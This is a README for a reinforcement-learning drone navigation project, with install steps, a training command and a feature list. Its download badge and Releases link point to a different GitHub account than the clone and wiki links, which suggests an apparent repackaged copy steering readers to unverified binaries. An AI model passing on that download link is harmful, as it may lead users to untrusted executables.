# 🚀 Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning - Navigate Drones with Ease

![Download](https://img.shields.io/badge/Download-From%20Releases-brightgreen)

## 📥 Download & Install

To get started, visit this page to download: [Releases Page](https://github.com/ghm006/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/releases).

## 🛠️ Installation Steps

This software is designed for use on Intel x86_64/Ubuntu 22.04 systems. Follow the steps below to install and set up the application.

1. **Clone the Repository:**
   Open a terminal and run the following command to download the code.

   ```sh
   git clone https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning.git
   ```

2. **Navigate to the Project Directory:**
   Change your working directory to the downloaded repository.

   ```sh
   cd Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/
   ```

3. **Set Up the Environment:**
   Create a new Python environment for this project.

   ```sh
   conda create -n drone python=3.9
   ```

4. **Activate the Environment:**
   Enable the newly created environment.

   ```sh
   conda activate drone
   ```

5. **Install Dependencies:**
   Use pip to install the required packages.

   ```sh
   pip3 install -e .
   ```

## 🚁 Getting Started

After installing, you can begin training your drone for navigation using reinforcement learning. Follow these steps:

1. **Navigate to the Training Directory:**
   Inside the terminal, make sure you are still in your project directory. If not, navigate back.

   ```sh
   cd Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/
   ```

2. **Train the Drone:**
   Start the training process by running this command.

   ```sh
   python train.py
   ```

## 🎓 Features

- **Reinforcement Learning:** This software uses advanced techniques for improving drone navigation.
- **RGBD Camera Support:** Capture and utilize visual data for better decisions.
- **Simulation Ready:** Designed for testing in safe environments before real-world applications.
- **Performance Tracking:** Record and analyze the training results to improve navigation strategies.

## 📝 Usage Instructions

1. **Running Experiments:**
   You can run multiple training sessions with different parameters to evaluate performance.

2. **Viewing Training Results:**
   After training, examine the recorded results to assess drone performance.

## 📊 Test Environment

This application has been tested in various scenarios using the Betaflight and NX systems, with state estimation provided by Vins. The environment setup gives reliable training results under controlled conditions.

## 🤖 Visual Demonstrations

You can view demo results of the navigation training process below:

![NavTest](assets/NavTest.gif)   
![NavTrain](assets/NavTrain.gif)   

## 📑 Documentation

For more details on usage options and advanced features, refer to the [Documentation](https://github.com/NOOBHZ233/Deep-Vision-Based-Drone-Navigation-Based-on-Reinforcement-Learning/wiki).

## 📧 Support

If you encounter any issues or have questions about this application, please reach out via the Issues tab in the repository. Your feedback is appreciated and helps improve the software.

---

For complete installation and usage details, ensure to follow each of these steps carefully. Happy navigating!